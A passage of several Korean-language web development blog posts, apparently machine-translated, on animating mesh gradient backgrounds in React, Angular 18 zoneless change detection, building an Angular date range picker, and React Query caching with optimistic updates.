메쉬 그라디언트 배경을 애니메이션화하여 웹사이트에 다이내미즘과 생동감을 더해주는 방법을 배워보겠어요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"https://miro.medium.com/v2/resize:fit:1400/1*PL_QXqTv_ibiPlDv9Ux1NQ.gif\" />\n\n# 준비물\n\n시작하기 전에 다음 사항을 준비해주세요:\n\n- React 프로젝트가 설정되어 있어야 합니다.\n- Tailwind 종속성이 설치되어 있어야 합니다. npm install -D tailwindcss postcss autoprefixer && npx tailwindcss init -p\n\n<div class=\"content-ad\"></div>\n\n\n![이미지](/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_1.png)\n\n# Mesh Gradient 배경 구현하기\n\n## 단계 1: Mesh Gradient Generator 찾기\n\n먼저, 우리는 애니메이션할 수 있는 mesh gradient를 생성해야 합니다. 빠른 구글 검색으로 몇 가지 훌륭한 mesh gradient 생성기를 찾을 수 있습니다. 이 기사에서는 CSS 형식으로 mesh gradient를 출력할 수 있는 것이 필요합니다. https://csshero.org/mesher/ 이 사이트를 사용해보세요.\n\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_2.png\" />\n\n## 단계 2: 메시 그라디언트 CSS를 배경으로 추가하기\n\n생성기에서 CSS 코드를 복사하여 React 컴포넌트에 추가해보세요. 그러면 배경이 메시 그라디언트로 변경될 것입니다.\n\nMeshGradientBackground.jsx\n\n<div class=\"content-ad\"></div>\n\n```js\nimport React from 'react';\n\nfunction MeshGradientBackground(props) {\n    return (\n        <div style={ {position: 'relative', height: '100vh'} }>\n            {/* Background using ::before pseudo-element */}\n            <div style={\n                {\n                    position: 'absolute',\n                    top: 0,\n                    left: 0,\n                    width: '100%',\n                    height: '100%',\n                    zIndex: -1, // Ensure background is behind content\n                    backgroundColor: '#ff99df',\n                    backgroundImage: `\n                        radial-gradient(circle at 52% 73%, hsla(310, 85%, 67%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 0% 30%, hsla(197, 90%, 76%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 41% 26%, hsla(234, 79%, 69%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 41% 51%, hsla(41, 70%, 63%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 41% 88%, hsla(36, 83%, 61%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 76% 73%, hsla(346, 69%, 70%, 1) 0px, transparent 50%),\n                        radial-gradient(circle at 29% 37%, hsla(272, 96%, 64%, 1) 0px, transparent 50%)`,\n                    backgroundSize: '100% 100%',\n                    filter: 'blur(80px)',\n                }\n            }></div>\n  \n        </div>\n    );\n}\n\nexport default MeshGradientBackground;\r\n```\n\n![Moving Mesh Gradient Background](/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_3.png)\n\n## 단계 3: 메쉬 그라디언트 배경 애니메이션화\n\n메쉬 그라디언트를 애니메이션화하는 것은 그라디언트 색상을 직접적으로 애니메이션화하는 것이 지원되지 않기 때문에 까다로울 수 있습니다. 이 문제를 해결하기 위해 배경 크기를 애니메이션화하여 움직임의 환상을 만들 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n업데이트한 내용이 있는 MeshGradientBackground.jsx 파일을 수정해주세요.\n\n```js\nimport React from 'react';\nimport '../../styles.css'; // 이 파일에 @keyframes 정의가 포함되어 있는지 확인해주세요\n\nfunction MeshGradientBackground(props) {\n    return (\n        <div style={{ position: 'relative', height: '100vh' }}>\n            {/* ::before 가상 요소를 사용한 배경 */}\n            <div style={{\n                position: 'absolute',\n                top: 0,\n                left: 0,\n                width: '100%',\n                height: '100%',\n                zIndex: -1, // 배경이 내용 뒤에 있도록 함\n                backgroundColor: '#ff99df',\n                backgroundImage: `\n                    radial-gradient(circle at 52% 73%, hsla(310, 85%, 67%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 0% 30%, hsla(197, 90%, 76%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 41% 26%, hsla(234, 79%, 69%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 41% 51%, hsla(41, 70%, 63%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 41% 88%, hsla(36, 83%, 61%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 76% 73%, hsla(346, 69%, 70%, 1) 0px, transparent 50%),\n                    radial-gradient(circle at 29% 37%, hsla(272, 96%, 64%, 1) 0px, transparent 50%)`,\n                backgroundSize: '150% 150%',\n                filter: 'blur(80px)',\n                animation: 'moveBackground 10s linear infinite',\n            }}></div>\n  \n        </div>\n    );\n}\n\nexport default MeshGradientBackground;\n```\n\nstyles.css 파일을 추가해주세요.\n\n```css\n@keyframes moveBackground {\n    0% { background-size: 100% 100%; }\n    10% { background-size: 120% 80%; }\n    20% { background-size: 190% 140%; }\n    30% { background-size: 130% 110%; }\n    40% { background-size: 150% 120%; }\n    50% { background-size: 180% 100%; }\n    60% { background-size: 220% 80%; }\n    70% { background-size: 100% 50%; }\n    80% { background-size: 120% 70%; }\n    90% { background-size: 110% 90%; }\n    100% { background-size: 100% 100%; }\n}\n```\n\n<div class=\"content-ad\"></div>\n\n\n![Background Animation](https://miro.medium.com/v2/resize:fit:1400/1*GURQVNHCw-MtVgHjeS4GcQ.gif)\n\nThe background should move like this.\n\nExplanation:\n\nThe moveBackground animation is applied to this div, making the background size change over time, which gives the illusion of movement.\n\n\n<div class=\"content-ad\"></div>\n\n요렇게 하면 됩니다 — 메쉬 그라데이션 배경을 애니메이션화하는 간단한 키프레임 애니메이션이 완성되었어요.\n\n하지만 여기서 멈출 수 없었어요. 이 아름다운 배경의 매력을 전시하는 전체 랜딩 페이지로 만들고 싶었거든요. 그래서 Figma에서 디자인을 만들고 코드로 구현했어요.\n\n![GIF](https://miro.medium.com/v2/resize:fit:1400/1*PL_QXqTv_ibiPlDv9Ux1NQ.gif)\n\n전체 구성 요소를 다운로드하려면 제 GitHub를 확인해주세요!","ogImage":{"url":"/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_0.png"},"coverImage":"/assets/img/2024-06-27-BringingLifetoYourWebsitewithMovingMeshGradientBackgrounds_0.png","tag":["Tech"],"readingTime":6},{"title":"Angular 18 Zoneless 2024년 핵심 기능 탐구","description":"","date":"2024-06-27 18:23","slug":"2024-06-27-Angular18ZonelessExploringthePillars","content":"\n\n\n![Image](/assets/img/2024-06-27-Angular18ZonelessExploringthePillars_0.png)\n\n\"동의하지 않을 수도 있지만, 저는 Angular이 존리스(zoneless)가 되길 원했고 실현될 줄은 상상도 못 했습니다. 이제 실험 모드로 Angular 18에서 사용할 수 있습니다. 제발 프로덕션 환경에서 사용하지 마십시오.\"\n\n# 존리스(zoneless)란?\n\n네, 맞습니다. Angular의 존리스 설정에서 Angular 스케줄러는 컴포넌트 내에서 무언가 변경되었을 때 변경 감지를 자동으로 트리거하지 않습니다. 대신 Angular의 ChangeDetectorRef 서비스를 사용하여 변경 감지를 수동으로 트리거해야 합니다.\n\n\n<div class=\"content-ad\"></div>\n\n여기 간단한 설명이 있어요:\n\nZone.js를 사용하는 기존 Angular 애플리케이션에서는 Angular이 모든 비동기 작업(HTTP 요청, setTimeout, 사용자 상호작용 등)이 완료될 때 자동으로 변경 감지를 트리거합니다. Zone.js는 이러한 비동기 작업들을 monkey-patch하여 Angular에게 변경 감지를 실행할 때 알리게 합니다.\n\n우리가 무언가를 요리했다고 생각하실 지도 모르겠지만, 네 개의 기둥은 어디에 있을까요? 🧐\n\n우선, Angular 18의 zoneless API를 확인하는 설정을 해야 합니다.\n\n<div class=\"content-ad\"></div>\n\n- 설치.\n\n```js\nng install @angular/cli@^18\n```\n\n2. 새 앱 만들기\n\n```js\nng new zoneless-app\ncd zoneless-app\n```\n\n<div class=\"content-ad\"></div>\n\n3. app.config.ts 파일이나 애플리케이션 부트스트랩 파일로 이동하세요.\n\n```js\nimport { ApplicationConfig, provideExperimentalZonelessChangeDetection, provideZoneChangeDetection } from '@angular/core';\nimport { provideRouter } from '@angular/router';\n\nimport { routes } from './app.routes';\n\nexport const appConfig: ApplicationConfig = {\n  providers: [provideExperimentalZonelessChangeDetection(), provideRouter(routes)]\n};\n```\n\n4. angular.json의 폴리필에서 zone.js를 제거하세요.\n\n<img src=\"/assets/img/2024-06-27-Angular18ZonelessExploringthePillars_1.png\" />\n\n<div class=\"content-ad\"></div>\n\n이제 모든 설정이 완료되었으니 애플리케이션을 실행하면 됩니다.\n\n이제 이 설정 이후에는 Angular가 자동으로 변경 감지를 트리거하지 않습니다.\n\n# 왜 zoneless를 사용해야 하는가? .\n\n불필요한 변경 감지를 피하기 위해서 간단하게 제안드립니다.\n\n<div class=\"content-ad\"></div>\n\n모든 컴포넌트의 비동기 작업이 발생할 때 Angular는 루트부터 모든 하위 컴포넌트를 확인하는데, 이는 비효율적일 수 있습니다.\n\n\"changeDetection\" 전략 \"OnPush\"를 사용하여 이 문제를 극복할 수 있는 옵션이 있습니다. 이는 컴포넌트와 해당 모든 하위 컴포넌트를 일반 변경 감지 주기에서 격리시킵니다.\n\n# 네 기둥이 무엇인가요?\n\n- 이벤트 핸들러.\n- MarkForChanges 관리.\n- 비동기 파이프.\n- 시그널.\n\n<div class=\"content-ad\"></div>\n\n## 이벤트 핸들러 :\n\n앵귤러의 이벤트 핸들러는 템플릿의 이벤트에 바인딩된 컴포넌트 클래스 내의 메서드입니다.\n\n```js\nimport { Component } from '@angular/core';\n\n@Component({\n  selector: 'app-root',\n  template: '<button (click)=\"onClick()\">{state}</button>'\n})\nexport class AppComponent {\n state = \"Click Me\";\n  onClick() {\n    this.state = \"Clicked\";\n  }\n}\n```\n\n## MarkForChanges 관리하기:\n\n<div class=\"content-ad\"></div>\n\n앵귤러에서, markForCheck은 앵귤러의 기본 변경 감지가 변경 사항을 감지하지 못하는 시나리오에서 사용됩니다. 이는 OnPush 변경 감지 전략 및 지금은 zoneless에서 일반적입니다.\n\n```js\nimport { ChangeDetectorRef, Component } from '@angular/core';\n\n@Component({\n  selector: 'app-root',\n  template: `\n      {data}\n      <button (click)=\"update()\">Update</button>\n     `,\n})\nexport class AppComponent {\n  data = '초기 데이터';\n\n  constructor(private cdr: ChangeDetectorRef) { }\n\n  update() {\n    this.data = '업데이트된 데이터';\n    this.cdr.markForCheck();\n  }\n}\n```\n\n## Async 파이프 :\n\n앵귤러의 AsyncPipe는 Observable 또는 Promise에 자동으로 구독하고 최신 값을 반환합니다. 또한 컴포넌트가 파괴될 때 자동으로 구독을 해제합니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nimport { CommonModule } from '@angular/common';\nimport { ChangeDetectionStrategy, ChangeDetectorRef, Component, inject } from '@angular/core';\nimport { bootstrapApplication } from '@angular/platform-browser';\nimport { Observable, of } from 'rxjs';\nimport 'zone.js';\n@Component({\n  selector: 'app-root',\n  standalone: true,\n  template: `\n     Hello world\n     {data$ | async }\n  `,\n  changeDetection: ChangeDetectionStrategy.OnPush,\n  imports: [CommonModule],\n})\nexport class App {\n  name = 'Angular';\n  data$: Observable<string> | undefined;\n  cRef = inject(ChangeDetectorRef);\n\n  constructor() {\n    setTimeout(() => {\n      this.data$ = of('Hello, AsyncPipe!');\n      this.cRef.markForCheck();\n    }, 4000);\n  }\n}\n\nbootstrapApplication(App);\n```\n\n## Signals:\n\nAngular에 Signals가 포함되어 정말 기쁩니다. 이전에는 불필요한 다시 렌더링 오버헤드를 극복하기 위해 신호를 사용해야 했습니다. 또한 이제 더 선언적 프로그래밍 스타일로 코드를 작성할 수 있고, 대부분의 주요 API는 Signals과 호환됩니다. 이것은 반응성을 위해 더 이상 RxJS에 의존하지 않아도 된다는 것을 의미합니다.\n\n```js\nimport { Component } from '@angular/core';\nimport { Signal, createSignal } from '@angular/core/signals';\n\n@Component({\n  selector: 'app-counter',\n  standalone: true,\n  template: `\n    <div class=\"counter\">\n      <h1>Counter: { count.value }</h1>\n      <button (click)=\"decrement()\">-</button>\n      <button (click)=\"increment()\">+</button>\n    </div>\n  `,\n  styles: [`\n    .counter {\n      text-align: center;\n      margin-top: 50px;\n    }\n    button {\n      margin: 0 5px;\n      padding: 10px;\n      font-size: 16px;\n    }\n  `]\n})\nexport class CounterComponent {\n  // Count 상태를 관리하기 위한 Signal 생성\n  count: Signal<number> = createSignal(0);\n\n  // Count 증가 메소드\n  increment() {\n    this.count.set(this.count.value + 1);\n  }\n\n  // Count 감소 메소드\n  decrement() {\n    this.count.set(this.count.value - 1);\n  }\n}\n```\n\n<div class=\"content-ad\"></div>\n\n\"markForCheck\" 또는 수동 변경 감지가 필요하지 않습니다.\n\n신호 패턴 때문에 수동 변경 감지 확인이 필요하지 않습니다. 수동 코드 작성 부담이 줄어들고, Angular 팀은 Input/Output, ViewChild 및 기타 모든 API를 신호로 변환하고 있습니다.\n\n## 마지막 기둥:\n\nSSR은 Angular의 마지막 기둥입니다. 다음 포스트에서 계속합니다.\n\n<div class=\"content-ad\"></div>\n\n## 결론:\n\nAngular은 이제 시그널의 도입으로 올바른 방향으로 나아가고 있습니다. Angular를 지원하는 중요한 요소 가운데 시그널이 특히 두드러집니다. 시그널은 Angular 18에서 존리스 작업으로의 전환을 용이하게 하뿐만 아니라 불필요한 다시 렌더링과 수동 변경 감지 확인의 부담으로부터 자유로움을 제공합니다. 이 방식은 성능을 향상시키는 것뿐만 아니라 더 선언적인 코딩 스타일을 촉진합니다.\n\n서버 측 렌더링(SSR)은 Angular의 중요한 측면으로 남아 있으며, 제가 이후에 다룰 것입니다. 이 네 가지 중요한 요소인 이벤트 핸들러, MarkForChanges 관리, 비동기 파이프, 그리고 시그널을 계속 탐험하면 코드를 더 읽기 쉽고 간단하게 만드는 데 기여하는 방법을 발견할 것입니다.\n\n즐거운 코딩되세요!","ogImage":{"url":"/assets/img/2024-06-27-Angular18ZonelessExploringthePillars_0.png"},"coverImage":"/assets/img/2024-06-27-Angular18ZonelessExploringthePillars_0.png","tag":["Tech"],"readingTime":6},{"title":"Angular로 사용자 지정 날짜 범위 선택기 만드는 방법","description":"","date":"2024-06-27 18:22","slug":"2024-06-27-CreatingaCustomDatesRangePickerinAngular","content":"\n\n이 글은 Angular에서 구성 요소로써 처음부터 날짜 범위 선택기를 만드는 방법을 설명하는 것을 목표로 하고 있습니다. 이것은 제 첫 번째 글의 두 번째 버전으로 여기에서 찾을 수 있습니다: [Medium 링크](https://medium.com/stackademic/creating-a-custom-date-time-picker-in-angular-5f00591d641c). 또한, 다음 글에서 작성할 사용자 정의 구성 요소의 장점을 잊지 않으세요.\n\n![이미지](/assets/img/2024-06-27-CreatingaCustomDatesRangePickerinAngular_0.png)\n  \n## 생성 의도\n\n이 구성 요소를 만들기 전에, 쉽게 스타일링할 수 있고 다음을 제공하는 범용 날짜 선택기를 찾고 있었습니다: 날짜 선택, 시간 선택, 범위 선택. 제가 필요한 것은 간단한 것이었지만, 조사 중에 대부분의 날짜 선택기가 너무 복잡하거나 필요한 조합을 제공하지 않는 것을 발견했습니다.\n\n<div class=\"content-ad\"></div>\n\n## 필요한 기능들:\n\n- 날짜 - 시간 선택기\n- 오직 날짜 선택기\n- 오직 시간 선택기\n- 날짜 - 범위 선택기\n\n이전에는 이 모든 것이 있었지만 범위 기능만 빠졌었어요. 그래서 논리를 간단한 말로 적어보기 시작했어요:\n\n# 논리\n\n<div class=\"content-ad\"></div>\n\n범위=false인 경우에 대한 두 가지 다른 출력이 필요합니다. 하나는 단일 선택이고 두 번째는 선택된 범위 배열이며 selectedRange[0]는 시작 선택이되고 selectedRange[1]는 끝 선택이됩니다.\n\n\n![Creating a Custom Dates Range Picker in Angular](/assets/img/2024-06-27-CreatingaCustomDatesRangePickerinAngular_1.png)\n\n\n그런 다음 범위를 확인하여 시각적으로 선택을 표시할 수 있도록해야합니다.\n\n```js\ninRangeSelection(i: number) {\n  const currentDay = new Date(\n    this.date.getFullYear(),\n    this.date.getMonth(),\n    i\n  );\n\n  return (\n    this.range &&\n    this.clickedDate &&\n    this.clickedToDate &&\n    this.clickedDate.getDate() < currentDay.getDate() &&\n    this.clickedToDate.getDate() > currentDay.getDate() &&\n    this.clickedDate.getFullYear() >= currentDay.getFullYear() &&\n    this.clickedToDate.getFullYear() >= currentDay.getFullYear() &&\n    this.clickedDate.getMonth() >= currentDay.getMonth() &&\n    this.clickedToDate.getMonth() >= currentDay.getMonth()\n  );\n}\n```\n\n<div class=\"content-ad\"></div>\n\n```js\n  setDate(index: number) {\n    // 만약 범위 선택이 요청된 경우\n    if (this.range) {\n      // 순서가 매우 중요합니다 -> 이미 범위가 있는 경우 새로운 선택을 클릭하면 다시 처음부터 시작합니다\n      if (this.clickedDate && this.clickedToDate) {\n        this.clickedDate = null;\n        this.clickedToDate = null;\n      }\n\n      // 이미 첫 번째 선택이 있는 경우 값을 clickedToDate에 할당합니다\n      if (this.clickedDate && !this.clickedToDate) {\n        this.clickedToDate = new Date(\n          this.date.getFullYear(),\n          this.date.getMonth(),\n          index\n        );\n      }\n\n      // 여기서만 첫 번째 및 가장 중요한 시작점 설정이 가능합니다\n      if (!this.clickedToDate && !this.clickedDate) {\n        this.clickedDate = new Date(\n          this.date.getFullYear(),\n          this.date.getMonth(),\n          index\n        );\n      }\n\n      // clickedToDate가 clickedDate보다 낮은 경우 뒤집습니다\n      if (\n        this.clickedDate &&\n        this.clickedToDate &&\n        this.clickedDate > this.clickedToDate\n      ) {\n        const clickedToDate = this.clickedDate;\n        const clickedDate = this.clickedToDate;\n        this.clickedDate = clickedDate;\n        this.clickedToDate = clickedToDate;\n      }\n    // 일반 모드에서\n    } else {\n      this.clickedDate = new Date(\n        this.date.getFullYear(),\n        this.date.getMonth(),\n        index\n      );\n    }\n  }\n```\n\n마지막으로 출력 메서드가 변경되었습니다:\n\n```js\n  confirm() {\n    if (this.range) {\n      if (this.clickedDate && this.clickedToDate) {\n        this.selectRange.emit([this.clickedDate, this.clickedToDate]);\n      }\n    } else {\n      if (this.clickedDate) {\n        this.clickedDate.setHours(this.timeForm.get('hours')?.value || 0);\n        this.clickedDate.setMinutes(this.timeForm.get('minutes')?.value || 0);\n        this.selectDate.emit(this.clickedDate);\n      }\n    }\n  }\n```\n\n## 모든 로직을 컴포넌트 내부에 놓게 된 이유는 무엇인가요?\n\n<div class=\"content-ad\"></div>\n\n만약 저장소에서 전체 컴포넌트를 확인했다면: https://github.com/marekpanti/dateTimePicker/blob/master/projects/marekpanti/angular-date-time-picker/src/lib/angular-date-time-picker.component.ts 아마도 궁금할 것입니다. 왜 Marek는 패서드와 깔끔한 컴포넌트에 대해 언급했을 때 모든 로직을 컴포넌트 내부에 넣는 건지요.\n\n룰에는 예외가 없는 법입니다. 복잡한 컴포넌트와 UI 컴포넌트의 경우, 나는 내 로직이 한 곳에 있기를 원합니다. 내 컴포넌트가 시각적이며 각 속성이 각 메소드와 연결되어 있음을 이해하기 때문에, 서비스를 분리하여 메소드를 읽는 것이 오히려 더 어려울 것입니다.\n\n# 결론\n\n이 글은 처음에 복잡해 보이지만 적절한 계획과 문제 이해로 자신만의 컴포넌트를 쉽게 만들 수 있는 방법을 잘 정리한 요약입니다.\n\n<div class=\"content-ad\"></div>\n\n# Stackademic 🎓\n\n끝까지 읽어 주셔서 감사합니다. 떠나시기 전에:\n\n- 작가를 칭찬하고 팔로우해 주시면 감사하겠습니다! 👏\n- 다음 채널을 구독해 주세요: X | LinkedIn | YouTube | Discord\n- 다른 플랫폼도 방문해 보세요: In Plain English | CoFeed | Differ\n- 더 많은 컨텐츠는 Stackademic.com에서 확인할 수 있습니다.","ogImage":{"url":"/assets/img/2024-06-27-CreatingaCustomDatesRangePickerinAngular_0.png"},"coverImage":"/assets/img/2024-06-27-CreatingaCustomDatesRangePickerinAngular_0.png","tag":["Tech"],"readingTime":5},{"title":"React Query 활용법 데이터 페칭 최강자 되기","description":"","date":"2024-06-27 18:20","slug":"2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse","content":"\n\nReact 어플리케이션을 더 빠르게 만들어주는 캐싱이 어떻게 변화를 주는지 궁금했던 적이 있나요? 이 블로그에서 React Query가 캐싱을 활용하여 데이터 가져오기와 관리를 간편하게 하는 방법을 탐구하고 있습니다. 뿐만 아니라 효율적인 캐싱을 위한 다양한 방법들을 살펴볼 예정이에요. 게다가, 낙관적 업데이트의 힘도 발견해 볼 거예요. 이것은 거의 사용되지 않는 주요 최적화 기술이랍니다.\n\n캐시란 무엇인가요?\nReact Query에서 캐시는 API 요청의 결과를 저장하는 임시 저장 메커니즘입니다. 이는 React 컴포넌트와 서버 사이에서 중개 역할을 하며, 자주 필요한 것들을 기억해두고 필요할 때 즉시 제공하는 친구처럼 작동합니다.\nReact Query의 내부 메커니즘을 이해하는 것은 사용하기 전에 필수적이며, 어플리케이션의 상태 관리에서 중요한 역할을 합니다.\n\nreact query를 사용하여 API 호출하는 간단한 예제를 살펴보겠습니다(세부적으로 아래에서 설명됩니다)\n\n![이미지](/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_0.png)\n\n<div class=\"content-ad\"></div>\n\nAPI 호출 후 받은 응답은 데이터에 저장되고 키를 'user'로하여 캐싱됩니다.\n\nReact Query 작동 방식: 깊게 들어가기\nReact Query가 어떻게 작동하는지 알아보기 전에 몇 가지 주요 용어에 익숙해져 보겠습니다.\n\nQueryClient — 인스턴스를 생성할 때 생성되는 queryCache 및 mutationCache를 보유하는 용기/컨테이너입니다.\n\nQueryCache — 모든 가져온 데이터와 쿼리 세부 정보를 저장하는 중앙 메모리입니다. 고유한 키를 사용하여 특정 데이터를 찾고 결과를 캐싱하고 앱 전반에 걸쳐 데이터를 일관되게 관리하여 성능을 향상시킵니다.\n\n<div class=\"content-ad\"></div>\n\nMutationCache — React Query에서 변이(mutation)는 데이터를 업데이트하는 작업(항목 추가 또는 제거와 같은 작업)을 의미합니다. 이 캐시는 이러한 변이의 결과를 일시적으로 저장하여 서버에서 확인될 때까지 그 결과를 유지합니다.\n\nQuery — 쿼리는 데이터를 가져오는 핵심 작업입니다. 필요한 정보(데이터, 상태 등)를 보유하며 해당 데이터를 가져오는 함수를 실행하고 데이터가 변경될 때 다시 시도, 취소 및 업데이트를 관리합니다. 데이터 가져오기 과정을 위한 소규모 관리자와 같은 역할을 합니다.\n\nQueryObservers — 옵저버(observer)는 useQuery를 호출할 때 생성되며 쿼리에 구독된 상태입니다. 이것이 useQuery에 쿼리 키(queryKey)를 전달하는 이유입니다.\n\n![이미지](/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_1.png)\n\n<div class=\"content-ad\"></div>\n\n이제 내부 작업을 살펴보겠습니다 - \n구성 요소가 마운트될 때 QueryClient의 인스턴스가 생성되고 QueryClientProvider를 통해 전체 응용 프로그램에 전달되며 (내부적으로 React Context를 사용함) 컨텍스트를 통해 사용됩니다.\n\nquery 키와 함께 useQuery를 호출할 때 useQuery는 QueryClient와 상호 작용합니다. QueryClient는 queryKey로 식별된 데이터를 QueryCache에서 확인합니다. 데이터가 존재하고 캐시/풀린 시간을 충족하며 다시 가져오기가 트리거되지 않은 경우:\n\n- 캐시된 데이터가 직접 구성 요소로 반환되고 구성 요소가 캐시된 데이터로 렌더링됩니다.\n- useQuery에 의해 생성된 QueryObserver가 구성 요소에 가용한 데이터에 대해 알립니다.\n\n데이터가 캐시에 없거나 신선도 기준을 충족하지 못한 경우:\n\n<div class=\"content-ad\"></div>\n\n- 쿼리 객체가 생성되고(아직 없는 경우), QueryObserver가 설정되어 Query에 연결됩니다.\n\n두 경우 모두, 데이터가 가져오는 동안 초기로딩 상태를 포함한 객체가 있습니다. useQuery에 제공된 queryFunction은 비동기적으로 트리거되어 새로운 데이터를 가져옵니다. 데이터를 가져오면 QueryCache에 쿼리 키와 함께 저장되고 QueryObserver에 업데이트에 대해 알립니다. 구성요소는 useQuery 훅을 통해 업데이트된 데이터를 받아와 새로운 데이터로 재렌더링이 트리거됩니다.\n\nReact Query에서 비동기 작업을 수행하는 방법은 useQuery와 useMutation 두 가지가 있습니다. 이러한 훅을 탐색해 봅시다.\n- useQuery: React 구성요소에서 데이터를 가져오기 위해 React Query 내에서 사용되는 사용자 정의 훅입니다. 이 훅은 초기 가져오기 후 데이터 캐싱, 백그라운드에서 데이터 다시 가져오기 등 많은 기능을 관리합니다.\n\n![LeveragingReactQueryAData-FetchingPowerhouse_2.png](/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_2.png)\n\n<div class=\"content-ad\"></div>\n\nuseQuery 훅을 사용하여 구문 및 데이터를 가져오는 방법을 확인해 봅시다.\n세 가지 매개변수가 필요합니다 -\n\n쿼리 키: 데이터를 가져오고 캐시하며 응용 프로그램 전반에서 쿼리를 다시 가져올 때 사용되는 고유한 키입니다.\n\n쿼리 함수:이 함수에는 프라미스를 반환하거나 오류를 발생시키는 비동기 작업이 포함되어 있습니다.\n\n옵션: CacheTime, staleTime, refetchInterval, refetchOnWindowFocus, retry 등 여러 속성이 포함된 개체입니다. 자세한 내용은 여기를 참조하시기 바랍니다.\n\n<div class=\"content-ad\"></div>\n\nuseQuery 훅은 여러 속성을 포함한 객체를 반환합니다:\n\n- data: API 응답입니다.\n- isLoading: API 호출의 현재 상태를 나타내는 부울 플래그입니다.\n- error: 쿼리가 데이터를 가져오는 동안 오류가 발생했을 경우 나타나는 객체입니다.\n- refetch: API 호출을 수동으로 트리거할 수 있는 함수입니다.\n\n그리고 더 많은 속성이 있는데, 자세한 내용은 여기를 참조해주세요.\n\n# 메모\n\n<div class=\"content-ad\"></div>\n\n쿼리 키는 적절한 캐싱과 재검색을 보장하기 위해 고유해야 합니다. 내부적으로 배열로 변환되어 키-값 쌍과 유사합니다.\n\n- 예를 들어, useQuery(`Todo`, fetchTodo) 는 키 `Todo`로 결과를 저장합니다.\n- useQuery([`Todo`, 1], () => fetchTodo(1)) 는 키 [`Todo`, 1] 로 결과를 저장합니다.\n\n이 두 캐시는 별개입니다. 의존성 목록에 거짓값이 포함되어 있다면 쿼리 함수가 호출되지 않습니다.\n\n다른 queryFunctions에 동일한 queryKey를 사용하면 해당 키 아래에 가장 최근 결과가 저장되어 잠재적인 문제를 야기할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\nUseMutation은 변경 작업(데이터 수정 작업)을 관리하는 강력한 훅입니다. 이를 통해 백엔드 API로 변이를 보내고 응답을 처리하는 프로세스가 간단해집니다.\n\n![이미지](/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_3.png)\n\nuseMutation에서 반환된 옵션과 객체는 거의 비슷하지만 refetch 대신 mutate를 반환하며 useMutation에는 queryKey가 없습니다. 왜냐하면 이들은 데이터 수정 작업이기 때문입니다.\nmutate는 변이를 시작하는 데 사용되는 함수입니다. 데이터 변이 함수로 보낼 데이터를 나타내는 선택적 페이로드를 인수로 받습니다.\n옵션 및 속성에 대한 자세한 내용은 이 링크를 참조하세요.\n\nuseMutation 및 useQuery를 활용한 예제를 살펴보겠습니다.\n\n<div class=\"content-ad\"></div>\n\n낙관적인 업데이트\n\n참고 - 이것은 일반적으로 대부분의 프로젝트에서 객체를 생성할 때 백엔드에서 id가 생성되기 때문에, 패치, 삭제 및 업데이트에 대해서만 작동합니다.\n\n위 예시를 고려해 봅시다. 할 일이 삭제되면 현재 2개의 작업이 발생합니다 -\n1. 할 일 ID로 삭제 호출.\n2. 즉시 업데이트된 할 일 목록 보여주기 위해 get 호출.\n\n이전 get API가 호출될 때, 응답과 함께 데이터가 캐시에 저장됩니다.\n우리가 해야 할 일은 캐시를 업데이트하는 것뿐입니다(캐시에서 항목에 기반한 할 일 항목 제거).\n\n<div class=\"content-ad\"></div>\n\n리액트 쿼리는 setQueryData를 사용하여 수동으로 캐시 관리하는 것보다 더 간편한 방법을 제공하여 캐시된 데이터를 업데이트할 수 있습니다. 이 방법을 사용하면 특정 쿼리 키와 연관된 데이터를 직접 수정할 수 있습니다.\n이에 대한 2가지 경우가 있습니다 -\n\n삭제 API 호출의 성공 후 캐시 업데이트\n이 경우, 삭제 API 호출이 성공한 경우에 캐시를 업데이트합니다.\n\n![이미지](/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_4.png)\n\nAPI 호출 전에 캐시 업데이트\n이 경우, API 호출이 성공할 것으로 가정하고 onMutate 함수를 사용하여 데이터를 업데이트합니다.\nonMutate은 변이가 발생하기 전에 실행됩니다. 따라서 여기서 todoItem을 삭제하고 있습니다.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-27-LeveragingReactQueryAData-FetchingPowerhouse_5.png\" />\n\n참고 -\n불변 업데이트: 항상 캐시 데이터를 불변하게 업데이트합니다. React Query는 기존 데이터를 직접 수정하는 대신 새로운 데이터 객체를 기대합니다.\n쿼리 키: 관련 캐시 항목을 대상으로 정확한 쿼리 키를 지정합니다.\n\n이 블로그에서는 React Query의 강력한 기능에 대해 살펴보았습니다. 특히 React 애플리케이션에서 데이터 가져오기와 관리를 최적화하기 위해 캐싱을 활용하는 방법에 중점을 두었습니다. React Query의 내부 메커니즘을 이해함으로써 QueryClient, QueryCache, MutationCache 및 QueryObservers와 같은 요소를 통해 개발자들은 API 요청을 효율적으로 처리하고 애플리케이션 성능을 향상시키며 애플리케이션 전체에서 데이터 일관성을 보장할 수 있습니다.\n\nuseQuery 및 useMutation 훅의 사용을 탐구하며 각각 데이터 가져오기 및 변이에 대한 역할을 강조했습니다. 게다가 낙관적 업데이트의 중요성을 논의하면서 사용자 경험을 향상시킬 수 있는 방법을 살펴보았습니다. 서버 확인을 기다리는 동안 즉각적인 피드백을 